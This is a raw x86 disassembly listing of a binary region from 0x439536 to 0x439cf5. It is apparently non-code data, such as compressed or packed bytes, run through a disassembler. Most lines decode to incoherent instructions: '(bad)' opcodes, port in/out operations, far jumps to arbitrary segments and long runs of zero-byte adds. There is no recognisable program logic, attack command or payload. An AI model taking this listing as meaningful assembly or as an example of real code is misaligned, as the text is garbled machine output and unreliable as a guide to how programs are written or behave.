  439536:	fild   QWORD PTR [edx-0x42825c01]
  43953d:	test   DWORD PTR [ebp+ebx*2+0x5],ebp
  439541:	int    0xd4
  439543:	inc    ecx
  439544:	mov    eax,0xfffd5b74
  439549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43954a:	jp     0x439511
  43954c:	and    eax,0x3f0601ac
  439551:	mov    al,0x56
  439553:	out    0x33,al
  439555:	repnz lods eax,DWORD PTR ds:[esi]
  439557:	or     bh,ah
  439559:	xor    cl,BYTE PTR [ebp-0x26]
  43955c:	sar    BYTE PTR [edi+0x15],1
  43955f:	daa    
  439560:	loope  0x439531
  439562:	jnp    0x439592
  439564:	sbb    eax,0xfffffff1
  439567:	adc    eax,0x5e5a7863
  43956c:	scas   eax,DWORD PTR es:[edi]
  43956d:	push   esi
  43956e:	(bad)  
  43956f:	ins    DWORD PTR es:[edi],dx
  439570:	(bad)  
  439571:	push   esi
  439572:	test   ch,0x2e
  439575:	lock std 
  439577:	ja     0x439505
  439579:	inc    ebp
  43957a:	inc    edx
  43957b:	std    
  43957c:	repnz lock ss int 0x37
  439581:	xor    BYTE PTR [esi+0x6d],dl
  439584:	dec    ebx
  439585:	add    BYTE PTR [eax],al
  439587:	add    BYTE PTR [eax],al
  439589:	add    BYTE PTR ds:0x237fe1f3,cl
  43958f:	add    esp,edi
  439591:	add    esi,ebp
  439593:	popa   
  439594:	repnz iret 
  439596:	xlat   BYTE PTR ds:[ebx]
  439597:	or     al,0xc0
  439599:	shr    DWORD PTR [ebx+0x7c],cl
  43959c:	rcl    BYTE PTR [ebx],0x35
  43959f:	loope  0x43961c
  4395a1:	mov    dh,BYTE PTR [eax]
  4395a3:	and    DWORD PTR [esi-0x119cce0c],0x6b
  4395aa:	repz xor eax,0x275056f
  4395b0:	out    0x32,eax
  4395b2:	adc    eax,0x603cccbb
  4395b7:	cmp    eax,0x37f869b6
  4395bc:	jle    0x4395c2
  4395be:	cli    
  4395bf:	into   
  4395c0:	ret    0xf027
  4395c3:	aas    
  4395c4:	into   
  4395c5:	mov    edi,0x41be1a96
  4395ca:	ins    BYTE PTR es:[edi],dx
  4395cb:	test   BYTE PTR [eax],al
  4395cd:	pop    ebp
  4395ce:	jns    0x4395d2
  4395d0:	add    BYTE PTR [edx-0x43],ah
  4395d3:	and    ebx,DWORD PTR [eax]
  4395d5:	jb     0x439609
  4395d7:	sbb    eax,0x45486aee
  4395dc:	xchg   edi,ebp
  4395de:	inc    BYTE PTR [ecx]
  4395e0:	xchg   BYTE PTR [edi-0x14ad7f8f],ah
  4395e6:	test   DWORD PTR [ebp+edi*8+0x70],0x9e8148da
  4395ee:	add    BYTE PTR [eax],al
  4395f0:	add    BYTE PTR [eax],al
  4395f2:	add    BYTE PTR [ebp+eax*8-0x40],dh
  4395f6:	jmp    0x1662:0x9d859e27
  4395fd:	out    0xf9,eax
  4395ff:	and    ecx,DWORD PTR [ecx-0x7]
  439602:	push   0xffffffcf
  439604:	inc    edi
  439605:	je     0x439653
  439607:	mov    dh,al
  439609:	and    edx,ecx
  43960b:	xor    dl,BYTE PTR [edx+0x232d7249]
  439611:	sbb    BYTE PTR [ebx+0x52],ah
  439614:	(bad)  
  439615:	out    0xea,al
  439617:	inc    al
  439619:	(bad)  
  43961a:	jo     0x43961f
  43961c:	inc    ebp
  43961d:	and    DWORD PTR [esi],0xedc0c576
  439623:	(bad)  
  439624:	mov    al,ds:0x49c0c1e7
  439629:	stc    
  43962a:	xchg   ecx,eax
  43962b:	ss cli 
  43962d:	sub    bh,0x77
  439630:	add    al,BYTE PTR [eax]
  439632:	jno    0x4396ad
  439634:	add    al,BYTE PTR [eax]
  439636:	jmp    0xca8bf882
  43963b:	mov    ch,0x45
  43963d:	mov    edi,0x822ca72
  439642:	(bad)
  439647:	inc    eax
  439648:	dec    ecx
  439649:	stc    
  43964a:	add    BYTE PTR [ebx+eax*2+0x8],al
  43964e:	test   esi,ebp
  439650:	add    BYTE PTR [eax],al
  439652:	add    BYTE PTR [esi+edi*8+0xffff],al
  439659:	add    BYTE PTR [eax],al
  43965b:	add    ah,bl
  43965d:	adc    esp,eax
  43965f:	dec    eax
  439660:	outs   dx,DWORD PTR ds:[esi]
  439661:	sar    edx,0xc1
  439664:	inc    edi
  439665:	xchg   edi,eax
  439666:	sbb    eax,0x7b47170c
  43966b:	jmp    0x3a4615
  439670:	daa    
  439671:	mov    ebx,0xf2704482
  439676:	out    dx,al
  439677:	fst    DWORD PTR [edi]
  439679:	aaa    
  43967a:	sbb    eax,0x6c08738
  43967f:	cmp    BYTE PTR [edx],0x1
  439682:	add    BYTE PTR [eax],al
  439684:	(bad)  
  439685:	mov    eax,0xf2407c7a
  43968a:	push   DWORD PTR [eax+esi*1+0x19]
  43968e:	mov    ecx,0x447c5c03
  439693:	and    al,0x54
  439695:	jmp    0x19400d52
  43969a:	mov    ecx,0xef78b0f3
  43969f:	sub    ebx,DWORD PTR [esi]
  4396a1:	fmul   QWORD PTR [ebp+0x3b]
  4396a4:	or     eax,0xdd2b4b35
  4396a9:	mov    bl,0xa3
  4396ab:	mov    eax,DWORD PTR [ebx+0x1c]
  4396ae:	jmp    0x1c24:0x447b64eb
  4396b5:	jmp    0x43967e
  4396b7:	jbe    0x439731
  4396b9:	add    esi,DWORD PTR [esp+0x0]
  4396bd:	add    esi,eax
  4396bf:	sub    eax,DWORD PTR [eax]
  4396c1:	add    BYTE PTR [eax],al
  4396c3:	add    BYTE PTR [eax],al
  4396c5:	fstp   QWORD PTR [ebx]
  4396c7:	enter  0x508b,0x22
  4396cb:	sbb    BYTE PTR [ebx],bh
  4396cd:	jne    0x439669
  4396cf:	retf   0x9e29
  4396d2:	call   0x3819:0x47eea44f
  4396d9:	out    dx,al
  4396da:	pop    ss
  4396db:	and    BYTE PTR [eax],dh
  4396dd:	mov    ds,WORD PTR [edx-0x6561e636]
  4396e3:	dec    edi
  4396e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4396e5:	out    dx,al
  4396e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4396e7:	es out dx,al
  4396e9:	into   
  4396ea:	dec    edi
  4396eb:	add    al,dh
  4396ed:	pop    esi
  4396ee:	stos   BYTE PTR es:[edi],al
  4396ef:	xchg   BYTE PTR [ecx+edx*2+0x53],al
  4396f3:	sbb    BYTE PTR [edi-0x40d7acd5],bh
  4396f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4396fa:	jg     0x439683
  4396fc:	icebp  
  4396fd:	pop    esi
  4396fe:	or     DWORD PTR [edi-0x78807938],eax
  439704:	je     0x43975f
  439706:	das    
  439707:	pushw  cs
  439709:	jnp    0x4396ef
  43970b:	push   edx
  43970c:	test   DWORD PTR [edx+0x5c],esi
  43970f:	int3   
  439710:	or     bl,bl
  439712:	push   ds
  439713:	xchg   ebp,esp
  439715:	jb     0x439784
  439717:	sbb    DWORD PTR [edx+ebp*2],esp
  43971a:	les    ebx,FWORD PTR [edi+0x9]
  43971d:	jecxz  0x43979e
  43971f:	sbb    DWORD PTR [edx+edi*2],eax
  439722:	aam    0x66
  439724:	or     DWORD PTR [edx-0x6e],edx
  439727:	mov    BYTE PTR [eax+eax*1+0x0],bl
  43972b:	add    BYTE PTR [eax],al
  43972d:	add    BYTE PTR [ecx+0x2ff6853],dl
  439733:	pop    esp
  439734:	xor    BYTE PTR [edi+0x711d35f6],bh
  43973a:	xchg   DWORD PTR [ebx+eiz*8-0xe],ecx
  43973e:	push   0xffffffb5
  439740:	adc    DWORD PTR [ebp+0x3b],edi
  439743:	push   edi
  439744:	add    al,0xed
  439746:	or     ebx,eax
  439748:	cmp    DWORD PTR [eax],esp
  43974a:	jb     0x43974e
  43974c:	mov    ?,WORD PTR [esp+ebp*2]
  43974f:	sub    DWORD PTR [edi-0x1d9d90fc],eax
  439755:	aam    0xce
  439757:	js     0x43973c
  439759:	sub    BYTE PTR [esp+ecx*4-0x4d],0x4
  43975e:	dec    edi
  43975f:	cmp    ecx,esi
  439761:	push   0xfffffff9
  439763:	inc    ecx
  439764:	cld    
  439765:	cli    
  439766:	or     ebx,DWORD PTR [edx-0x29]
  439769:	test   eax,0xf40ac68a
  43976e:	ins    DWORD PTR es:[edi],dx
  43976f:	jl     0x43976c
  439771:	add    DWORD PTR [ebp+0x2],esi
  439774:	adc    al,dl
  439776:	push   esi
  439777:	out    dx,al
  439778:	rcr    DWORD PTR [ecx+0x3e4f29a],1
  43977e:	jne    0x4397f9
  439780:	pop    ss
  439781:	inc    edx
  439782:	fwait
  439783:	icebp  
  439784:	jle    0x439779
  439786:	jge    0x439806
  439788:	inc    edi
  439789:	add    esi,DWORD PTR [ebp+0x2]
  43978c:	data16 arpl WORD PTR [esi+ecx*8-0xe],bp
  439791:	add    al,0x0
  439793:	add    BYTE PTR [eax],al
  439795:	add    BYTE PTR [eax],al
  439797:	inc    eax
  439798:	inc    edx
  439799:	loop   0x439780
  43979b:	xor    dh,ah
  43979d:	mov    BYTE PTR [edx-0x68],al
  4397a0:	pop    edx
  4397a1:	mov    BYTE PTR [edi],0xf6
  4397a4:	jb     0x439744
  4397a6:	rcl    BYTE PTR [edx+0x1],0x18
  4397aa:	add    al,0x38
  4397ac:	inc    edx
  4397ad:	push   si
  4397af:	xchg   ebp,eax
  4397b0:	retf   
  4397b1:	hlt    
  4397b2:	add    cl,bh
  4397b4:	dec    ebp
  4397b5:	jmp    0x7c08:0xa97f6ce1
  4397bc:	dec    edi
  4397bd:	leave  
  4397be:	xchg   DWORD PTR [esi],esi
  4397c0:	and    esi,edx
  4397c2:	pop    esi
  4397c3:	xor    al,0x78
  4397c5:	sbb    ebp,DWORD PTR [eax]
  4397c7:	xor    ebx,0xf9a991ff
  4397cd:	jns    0x439790
  4397cf:	jbe    0x43979a
  4397d1:	shl    BYTE PTR [edx+0x6d],cl
  4397d4:	lds    ecx,FWORD PTR [eax]
  4397d6:	push   edi
  4397d7:	xor    eax,0x4aa8d87d
  4397dc:	repnz and al,0x80
  4397df:	jbe    0x4397b9
  4397e1:	(bad)  
  4397e2:	push   ecx
  4397e3:	loope  0x4397df
  4397e5:	or     DWORD PTR [ebp+0x79],0x2
  4397e9:	add    BYTE PTR [edx+0x51],ch
  4397ec:	stc    
  4397ed:	jae    0x439805
  4397ef:	jbe    0x439826
  4397f1:	mov    edi,0x93bd4f6
  4397f6:	fistp  QWORD PTR [ecx]
  4397f8:	sbb    eax,0xae8
  4397fd:	add    BYTE PTR [eax],al
  4397ff:	add    BYTE PTR [ebp+0x7f],dh
  439802:	nop
  439803:	mov    dl,0xbb
  439805:	inc    ebx
  439806:	(bad)  
  439807:	pop    ds
  439808:	sbb    dh,cl
  43980a:	and    ecx,DWORD PTR ds:0xad254112
  439810:	push   edx
  439811:	sbb    dh,BYTE PTR ds:0xa6c4762a
  439817:	jmp    0x33c89a92
  43981c:	repnz push ecx
  43981e:	and    eax,0xfd5af21a
  439823:	bound  ebp,QWORD PTR [edi+0x7a]
  439826:	add    DWORD PTR [ebx+0x2f],esi
  439829:	inc    esp
  43982a:	xchg   DWORD PTR [edi-0x153e3a88],edx
  439830:	into   
  439831:	sar    esi,0x60
  439834:	inc    BYTE PTR [esi+edi*2-0x52]
  439838:	jae    0x43988f
  43983a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43983b:	jb     0x439887
  43983d:	pop    ds
  43983e:	sub    al,0x62
  439840:	ficomp DWORD PTR [esi]
  439842:	or     al,al
  439844:	push   ebp
  439845:	dec    ecx
  439846:	stc    
  439847:	add    BYTE PTR [ebx],dh
  439849:	add    BYTE PTR [ecx+0x0],0x9f
  43984d:	mov    ah,0xf8
  43984f:	je     0x4397d5
  439851:	idiv   BYTE PTR [ebx+0x24]
  439854:	je     0x439880
  439856:	stos   DWORD PTR es:[edi],eax
  439857:	dec    edi
  439858:	xchg   DWORD PTR ds:0xa65f0782,eax
  43985e:	cli    
  43985f:	xchg   DWORD PTR [ebx+0x4787fd],ebx
  439865:	add    BYTE PTR [eax],al
  439867:	add    BYTE PTR [eax],al
  439869:	into   
  43986a:	(bad)  
  43986b:	add    ecx,DWORD PTR ds:[edi-0x48]
  43986f:	add    esi,ebx
  439871:	les    ebx,FWORD PTR es:[ebx+0x24]
  439875:	aam    0xa5
  439877:	(bad)  
  439878:	(bad)  
  439879:	push   ebx
  43987a:	mov    al,0x82
  43987c:	jmp    esp
  43987e:	or     BYTE PTR ds:[ebp-0x8e],al
  439885:	pop    ds
  439886:	fild   WORD PTR [esi]
  439888:	maxps  xmm7,XMMWORD PTR [esi+0x1c4d7e06]
  43988f:	or     al,0x85
  439891:	sub    al,0x94
  439893:	cmp    al,0x0
  439895:	lahf   
  439896:	add    al,0x83
  439898:	add    al,0x17
  43989a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43989b:	retf   
  43989c:	(bad)  
  43989d:	push   ebx
  43989e:	mov    al,0x82
  4398a0:	inc    esp
  4398a2:	inc    ebp
  4398a3:	or     BYTE PTR [ebp+0x5b2],al
  4398a9:	iret   
  4398aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4398ab:	push   es
  4398ac:	movq   mm6,mm0
  4398af:	push   es
  4398b0:	jle    0x43984f
  4398b2:	call   0x70f01dc2
  4398b7:	cmp    al,0x0
  4398b9:	xlat   BYTE PTR ds:[ebx]
  4398ba:	dec    ecx
  4398bb:	sbb    eax,0x82ff4f0c
  4398c0:	add    al,0xa4
  4398c2:	fst    QWORD PTR [eax]
  4398c4:	push   DWORD PTR [ebp+0x58]
  4398c7:	dec    edi
  4398c8:	test   DWORD PTR [edx],esp
  4398ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4398cb:	cmp    eax,DWORD PTR [ebp+0x0]
  4398d1:	add    BYTE PTR [ecx+0x2cf1180f],dh
  4398d7:	mov    ch,0xd7
  4398d9:	and    ecx,DWORD PTR [ebp+0x34]
  4398dc:	inc    esp
  4398dd:	or     edi,esi
  4398df:	lea    eax,[eax+eax*1]
  4398e2:	jne    0x439910
  4398e4:	cmp    al,0x7d
  4398e6:	jno    0x43992f
  4398e8:	or     eax,0x1c4b6000
  4398ed:	mov    edi,0xcf0b9b76
  4398f2:	arpl   bx,sp
  4398f4:	sbb    cl,bh
  4398f6:	mov    bh,0x7a
  4398f9:	icebp  
  4398fa:	sahf   
  4398fb:	mov    esp,0x9a7e4a5a
  439900:	(bad)  
  439901:	inc    ebp
  439902:	mov    ?,edx
  439904:	push   edx
  439905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439906:	(bad)  
  439907:	fcomp  DWORD PTR [edx]
  439909:	in     eax,dx
  43990a:	sahf   
  43990b:	imul   edi,DWORD PTR [esp+eax*2+0x59],0x1b
  439910:	or     ecx,eax
  439912:	and    edx,DWORD PTR [ebx]
  439914:	add    esi,DWORD PTR [ecx+ebx*2+0x37]
  439918:	add    al,0xf0
  43991a:	pop    esi
  43991b:	cli    
  43991c:	sbb    cl,al
  43991e:	ds sbb dl,dh
  439921:	and    eax,0xa452fa4e
  439926:	(bad)  
  439927:	xchg   esi,eax
  439928:	and    DWORD PTR [eax],edi
  43992a:	(bad)  
  43992b:	and    WORD PTR [eax],si
  43992e:	sahf   
  43992f:	cli    
  439930:	aad    0x15
  439932:	mov    ds,WORD PTR [edx]
  439934:	push   ebx
  439935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439936:	add    BYTE PTR [eax],al
  439938:	add    BYTE PTR [eax],al
  43993a:	add    dh,bh
  43993c:	aaa    
  43993d:	sbb    al,0xed
  43993f:	pop    esi
  439940:	pop    ebx
  439941:	add    al,0xf0
  439943:	mov    ?,WORD PTR [edx]
  439945:	or     al,0xcf
  439947:	ret    
  439948:	add    ch,bh
  43994a:	sbb    al,0x42
  43994c:	xor    eax,0xed247c83
  439951:	aad    0x7c
  439953:	cmp    esi,DWORD PTR ds:0xe6a17c83
  439959:	adc    bh,BYTE PTR [ebp-0x4f]
  43995c:	out    0xee,al
  43995e:	pop    edx
  43995f:	push   ecx
  439960:	inc    eax
  439961:	mov    dl,0x50
  439963:	retf   0xe89
  439966:	(bad)  
  439969:	std    
  43996a:	add    esi,DWORD PTR [ebp+0x2]
  43996d:	mov    ds,WORD PTR [edi]
  43996f:	sbb    eax,0x2a001ae2
  439974:	add    ah,bh
  439976:	add    esi,DWORD PTR [ebp+0x7c]
  439979:	out    dx,al
  43997a:	add    esi,DWORD PTR [ebp+0x2]
  43997d:	mov    gs,edi
  43997f:	add    eax,DWORD PTR [esi+0x7ac2c50e]
  439985:	int    0x3
  439987:	jne    0x43998b
  439989:	dec    esi
  43998a:	repz stc 
  43998c:	mov    ch,0x2
  43998e:	and    dl,ah
  439990:	lea    ebp,[esi-0x12855d3c]
  439996:	add    esi,DWORD PTR [ebp+0x2]
  439999:	dec    esi
  43999a:	add    edi,eax
  43999c:	lds    eax,FWORD PTR [edx]
  43999e:	lods   al,BYTE PTR ds:[esi]
  43999f:	add    BYTE PTR [eax],al
  4399a1:	add    BYTE PTR [eax],al
  4399a3:	add    bh,dh
  4399a5:	dec    edx
  4399a6:	mov    ebx,0xcec9fa04
  4399ab:	jl     0x4399e2
  4399ad:	push   ds
  4399ae:	jo     0x4399a3
  4399b0:	pop    ecx
  4399b1:	add    esp,DWORD PTR [esi+0xe]
  4399b4:	mov    ch,0x42
  4399b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4399b7:	add    esp,DWORD PTR [ebx-0x49]
  4399ba:	in     al,0x7c
  4399bc:	mov    WORD PTR ds:[ebx+0x2e8bad27],gs
  4399c3:	jl     0x43996a
  4399c5:	push   ds
  4399c6:	add    BYTE PTR [eax],ch
  4399c8:	lahf   
  4399c9:	cmp    eax,0x5fb4f826
  4399ce:	std    
  4399cf:	adc    DWORD PTR [eax-0x79],esp
  4399d2:	js     0x4399c1
  4399d4:	test   eax,0x5e623bd8
  4399d9:	mov    ebx,DWORD PTR [ebp+eax*1+0x25]
  4399dd:	stc    
  4399de:	pop    ebx
  4399df:	or     eax,0x1213b50d
  4399e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4399e5:	test   DWORD PTR [eax],ebx
  4399e7:	pusha  
  4399e8:	(bad)
  4399eb:	jmp    0x25f7:0xed5885a7
  4399f2:	add    eax,0x13e41ae8
  4399f7:	pusha  
  4399f8:	mov    DWORD PTR [ebp-0x1],esi
  4399fb:	call   0x8b109c76
  439a00:	push   cs
  439a01:	mov    edi,0xfd31293a
  439a06:	(bad)  
  439a07:	jmp    0x9d00:0x0
  439a0e:	pop    es
  439a0f:	or     DWORD PTR [edx+0x2c7a0930],ebx
  439a15:	mov    dl,0xb2
  439a17:	sbb    al,0x52
  439a19:	sub    BYTE PTR [eax-0x1c1a9dc9],ch
  439a1f:	adc    edx,DWORD PTR [edx]
  439a21:	dec    ebx
  439a22:	mov    ah,0x5
  439a24:	adc    ah,BYTE PTR [ebx-0x43]
  439a27:	mov    esp,0x3da09f2
  439a2c:	inc    edx
  439a2d:	jg     0x439a15
  439a2f:	in     al,dx
  439a30:	ss dec ebx
  439a32:	mov    ebp,0xb2f1f2c1
  439a37:	add    esi,DWORD PTR [edx+0x25]
  439a3a:	jecxz  0x439a4b
  439a3c:	rcl    BYTE PTR [ebx-0x743df54c],cl
  439a42:	mov    edi,0x65d00bc
  439a47:	add    BYTE PTR [eax],al
  439a49:	lds    ebp,FWORD PTR [esi+0x9]
  439a4c:	jmp    0x439aa7
  439a4e:	sbb    al,0xf3
  439a50:	imul   DWORD PTR [ebx-0x7b]
  439a53:	mov    edi,0x31d01
  439a58:	mov    DWORD PTR [esi+esi*1-0x4eb33b84],edx
  439a5f:	push   edx
  439a60:	pop    ebp
  439a61:	dec    edx
  439a62:	outs   dx,DWORD PTR ds:[esi]
  439a63:	mov    esp,0xcbfec8cc
  439a68:	int3   
  439a69:	fdivr  st,st(6)
  439a6b:	retf   
  439a6c:	int3   
  439a6d:	popa   
  439a6e:	mov    ebx,0x83eb
  439a73:	add    BYTE PTR [eax],al
  439a75:	add    BYTE PTR [eax-0x13aa7bb2],bh
  439a7b:	adc    eax,eax
  439a7d:	cmovae edi,ebx
  439a80:	add    cl,0xd
  439a83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439a84:	ud2    
  439a86:	or     eax,0x40458275
  439a8b:	mov    esi,0x4a45a83c
  439a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439a91:	mov    DWORD PTR [ecx-0x7fba7e6a],edx
  439a97:	mov    esi,0x4a25b83c
  439a9c:	mov    ch,0x89
  439a9e:	rol    edx,1
  439aa0:	sub    al,al
  439aa2:	jecxz  0x439a5f
  439aa4:	je     0x439ab2
  439aa6:	adc    ecx,esi
  439aa8:	jae    0x439ac4
  439aaa:	daa    
  439aab:	add    eax,0x29c9b85
  439ab0:	add    BYTE PTR [eax],al
  439ab2:	fwait
  439ab3:	xchg   edi,eax
  439ab4:	or     al,0x47
  439ab6:	mov    dl,0xcf
  439ab8:	inc    ebx
  439ab9:	dec    ebp
  439aba:	rol    BYTE PTR [edx+0x41b04d4c],0x34
  439ac1:	ret    0x9975
  439ac4:	pop    ebx
  439ac5:	test   eax,esp
  439ac7:	xor    esi,DWORD PTR [esi+0xa]
  439aca:	cld    
  439acb:	jbe    0x439b16
  439acd:	mov    eax,0xfffd2b7a
  439ad2:	in     eax,0x8d
  439ad4:	jle    0x439b52
  439ad6:	mov    al,0xc7
  439ad8:	cld    
  439ad9:	jb     0x439adb
  439adb:	add    BYTE PTR [eax],al
  439add:	add    BYTE PTR [eax],al
  439adf:	jnp    0x439ad4
  439ae1:	jle    0x439adb
  439ae3:	je     0x439abd
  439ae5:	dec    ebp
  439ae6:	xchg   DWORD PTR [eax-0x5c37f8b9],edi
  439aec:	es jbe 0x439b32
  439aef:	adc    DWORD PTR [ecx-0x8ca7cc5],esi
  439af5:	adc    al,0x85
  439af7:	mov    eax,0x3210785f
  439afc:	out    0xf3,eax
  439afe:	aas    
  439aff:	je     0x439b2c
  439b01:	std    
  439b02:	test   BYTE PTR [eax],bh
  439b04:	cmp    esi,DWORD PTR [esi+0x6]
  439b07:	imul   BYTE PTR [ebx]
  439b09:	add    DWORD PTR [ebp+0x7cf5a285],eax
  439b0f:	jne    0x439b40
  439b11:	lods   al,BYTE PTR ds:[esi]
  439b12:	shl    BYTE PTR [ebx+0x2a],0xfd
  439b16:	push   DWORD PTR [ebp+0x78]
  439b19:	cmp    eax,0xa986ee5a
  439b1e:	mov    esp,0xfffd6046
  439b23:	jne    0x439b50
  439b25:	or     BYTE PTR [ebp+0x7ce3262b],bh
  439b2b:	sbb    DWORD PTR [esi-0x5f],ebp
  439b2e:	add    BYTE PTR [eax],cl
  439b30:	shl    BYTE PTR cs:[ebp*4-0x51caaf87],0x78
  439b39:	add    BYTE PTR [edi-0x7a10e8],al
  439b3f:	jb     0x439b43
  439b41:	out    0x3,eax
  439b43:	add    BYTE PTR [eax],al
  439b45:	add    BYTE PTR [eax],al
  439b47:	add    al,dh
  439b49:	inc    edi
  439b4a:	ins    BYTE PTR es:[edi],dx
  439b4b:	call   0x95259de6
  439b50:	loope  0x439b21
  439b52:	inc    edx
  439b53:	add    DWORD PTR [ebx-0x17],eax
  439b56:	sbb    ah,cl
  439b58:	fs ret 
  439b5a:	gs dec ebx
  439b5c:	ins    BYTE PTR es:[edi],dx
  439b5d:	mov    ah,0x1
  439b5f:	jns    0x439b27
  439b61:	or     ah,BYTE PTR [edx+esi*1-0x51]
  439b65:	adc    DWORD PTR [ebp+edx*2-0x5f],ebp
  439b69:	pop    es
  439b6a:	dec    bx
  439b6c:	and    dh,BYTE PTR [ecx-0x7e425724]
  439b72:	lahf   
  439b73:	dec    esp
  439b74:	scas   eax,DWORD PTR es:[edi]
  439b75:	mov    esp,ecx
  439b77:	scas   al,BYTE PTR es:[edi]
  439b78:	leave  
  439b79:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439b7b:	in     eax,0xfb
  439b7d:	(bad)  
  439b7e:	push   0xe73cfb8b
  439b83:	add    ebx,eax
  439b85:	or     DWORD PTR [edi+eiz*4-0x6f],esi
  439b89:	add    ah,bh
  439b8b:	add    esi,DWORD PTR [ebp-0x6e]
  439b8e:	or     DWORD PTR [ecx+0x29],edi
  439b91:	pop    es
  439b92:	arpl   bp,sp
  439b94:	ror    eax,1
  439b96:	jmp    0x439b3f
  439b98:	dec    eax
  439b99:	inc    edx
  439b9a:	in     eax,0xe5
  439b9c:	sti    
  439b9d:	int    0xeb
  439b9f:	xchg   DWORD PTR [eax],edi
  439ba1:	cmp    cl,cl
  439ba3:	rcr    DWORD PTR [ebx+0x59f3bc88],1
  439ba9:	inc    edx
  439baa:	xor    DWORD PTR fs:[eax],eax
  439bad:	add    BYTE PTR [eax],al
  439baf:	add    BYTE PTR [eax],al
  439bb1:	sub    esi,ebp
  439bb3:	enter  0x5980,0xc5
  439bb7:	out    0xd7,al
  439bb9:	jb     0x439bc8
  439bbb:	jp     0x439bbc
  439bbd:	xor    eax,0x2fbf720d
  439bc2:	xchg   BYTE PTR [eax],al
  439bc4:	bound  esp,QWORD PTR [ebx+0x7a606218]
  439bca:	enter  0x5e08,0x6a
  439bce:	ret    
  439bcf:	popa   
  439bd0:	push   ds
  439bd1:	cmp    cl,cl
  439bd3:	and    DWORD PTR [edx+0x43],0x4
  439bd7:	mov    ebx,DWORD PTR [ebp-0x3dbf7fed]
  439bdd:	mov    ah,0xac
  439bdf:	shl    DWORD PTR [edx-0x48],cl
  439be2:	mov    ebp,0x39efe9e7
  439be7:	stc    
  439be8:	out    dx,al
  439be9:	mov    esi,0x453131b6
  439bee:	xadd   DWORD PTR [ecx*2+0x71294ad2],esp
  439bf6:	inc    ecx
  439bf7:	inc    ebx
  439bf8:	leave  
  439bf9:	mov    edi,eax
  439bfb:	aas    
  439bfc:	jmp    0xd327638a
  439c01:	imul   edi,DWORD PTR [edx-0x30],0x2c3c3125
  439c08:	jmp    0x439c82
  439c0a:	add    al,BYTE PTR [eax]
  439c0c:	jo     0x439bc2
  439c0e:	push   edi
  439c0f:	mov    eax,0xfffc1df9
  439c14:	ret    
  439c15:	add    BYTE PTR [eax],al
  439c17:	add    BYTE PTR [eax],al
  439c19:	add    BYTE PTR [eax+0x3c],dh
  439c1c:	stc    
  439c1d:	jmp    0xea275b59
  439c22:	jno    0x439c26
  439c24:	add    BYTE PTR [edx-0x2abc7944],dl
  439c2a:	cmp    DWORD PTR [edi+0x1fb4a6db],edi
  439c30:	or     eax,0x870276e9
  439c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439c36:	push   ss
  439c37:	test   DWORD PTR [ebx-0x3],edx
  439c3a:	sbb    ecx,DWORD PTR [ebp*1-0x840efd7]
  439c41:	add    BYTE PTR ds:0xd189ed41,al
  439c47:	out    dx,eax
  439c48:	or     BYTE PTR [ebp+0x40],0x8e
  439c4c:	stc    
  439c4d:	call   FWORD PTR [edi+edi*8-0x36]
  439c51:	loopne 0x439c38
  439c53:	jno    0x439c36
  439c55:	mov    edx,DWORD PTR [ecx+edi*4+0x49d5ff47]
  439c5c:	int    0x89
  439c5e:	sbb    edi,esp
  439c60:	or     BYTE PTR [ebp-0x80],0x83
  439c64:	test   BYTE PTR [ecx],0xc9
  439c67:	add    BYTE PTR ds:0xffff4f54,dh
  439c6d:	jmp    0x3bc9:0x2f68416
  439c74:	ss push eax
  439c76:	push   cs
  439c77:	(bad)  
  439c78:	dec    DWORD PTR [esi]
  439c7a:	(bad)  
  439c7b:	sar    eax,cl
  439c7d:	inc    DWORD PTR [eax]
  439c7f:	add    BYTE PTR [eax],al
  439c81:	add    BYTE PTR [eax],al
  439c83:	sbb    al,0xbc
  439c85:	dec    esp
  439c86:	sbb    al,0x85
  439c88:	jb     0x439c73
  439c8a:	jmp    0x439ca6
  439c8c:	mov    edx,0x4a970040
  439c91:	int    0x8b
  439c93:	mov    edx,edx
  439c95:	or     BYTE PTR [ebp+0xc],0xbc
  439c99:	ins    BYTE PTR es:[edi],dx
  439c9a:	in     al,0x66
  439c9c:	les    esp,FWORD PTR [ecx]
  439c9e:	ret    0x4254
  439ca1:	or     cl,BYTE PTR [edi]
  439ca3:	sub    eax,DWORD PTR [esi]
  439ca5:	or     eax,0xffffffb7
  439ca8:	clc    
  439ca9:	je     0x439cb5
  439cab:	sbb    al,BYTE PTR [edx+0x9]
  439cae:	add    BYTE PTR [edx-0x43],ch
  439cb1:	cmp    al,0x12
  439cb3:	neg    DWORD PTR [esi+esi*2]
  439cb6:	push   ds
  439cb7:	daa    
  439cb8:	inc    edx
  439cb9:	jmp    0x8342a7cd
  439cbe:	dec    ebp
  439cbf:	jne    0x439c8a
  439cc1:	add    eax,eax
  439cc3:	call   FWORD PTR [ebp+esi*8-0x79]
  439cc7:	cmp    BYTE PTR [ecx+0x7a],bl
  439cca:	dec    ebx
  439ccb:	mov    eax,ds:0x6d047a42
  439cd0:	dec    ebx
  439cd1:	jl     0x439d16
  439cd3:	xchg   esp,eax
  439cd5:	cli    
  439cd6:	sub    al,0x3c
  439cd8:	jmp    0x4b7c:0x81d50fbf
  439cdf:	xchg   DWORD PTR [ecx+edi*1+0x3da53f25],esp
  439ce6:	test   DWORD PTR [eax],eax
  439ce8:	add    BYTE PTR [eax],al
  439cea:	add    BYTE PTR [eax],al
  439cec:	enter  0x8b03,0xff
  439cf0:	inc    edx
  439cf1:	sub    al,0xfd
  439cf3:	int3   
  439cf4:	push   edi
  439cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
